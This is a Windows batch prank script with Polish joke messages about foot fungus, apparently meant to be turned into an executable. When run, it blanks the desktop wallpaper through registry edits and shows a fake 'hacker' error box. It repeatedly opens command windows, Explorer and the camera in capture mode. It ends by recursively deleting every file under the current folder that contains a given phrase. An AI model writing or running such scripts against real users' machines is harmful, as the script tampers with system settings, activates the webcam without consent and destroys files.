::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDZBTwyDAE+/Fb4I5/jHyPidu08UV+N/SI7Y0fS+Es9YoXnteJER1G9JkM8wAwtdbBPmaRd5pWFFuSqMNMj8
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDZBTwyDAE+/Fb4I5/jHyPidu08UV+N/SI7Y0fS+Es9YoXnzfJgp2W1JpM4UCSdaawGjajMVv2tMsWGXJPuzowrzSwiu3gU1A2AU
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 4

title It's Grzybin' Time
echo Grzyb jest podly, grzyb jest zly, lepiej umyj swoje stopy... > grzybek.txt
echo !!!!! Jezeli chcesz ZAGLADY grzyba, poczekaj 2 sekund. !!!!!
echo.
echo !!!!! Jezeli chcesz ANULOWAC zaglade, wyjdz z konsoli w przeciagu 2 sekund. !!!!!
echo.
timeout /t 2
msg * "Niech sie zacznie grzyb na stopach."

curl -o podarunek.jpg https://i.ytimg.com/vi/uuOb-AfchV0/mqdefault.jpg
set imagepath=%CD%\podarunek.jpg

for /l %%x in (1, 1, 10) do (
  mkdir "domek_grzybowski %%x"
)

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
reg add "HKCU\Control Panel\Desktop" /v Background /t REG_SZ /d "0 0 0" /f
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "0" /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters

echo x=msgbox("grzybica avengers cie dopadla (ERROR:464)", 16, "hacker-admin@10.0.0.51:3000") > hacker_msg.vbs
start hacker_msg.vbs

for /l %%x in (1, 1, 3) do (
  start %windir%\system32\cmd.exe
  start %windir%\explorer.exe
  start %imagepath%
  start microsoft.windows.camera:/action=capture
  msg * "ripuwe masz"
)

set search_string=Grzybica Avengers
forfiles /p %cd% /s /m * /c "cmd /c findstr /m /i /c:%search_string% @file && del @path"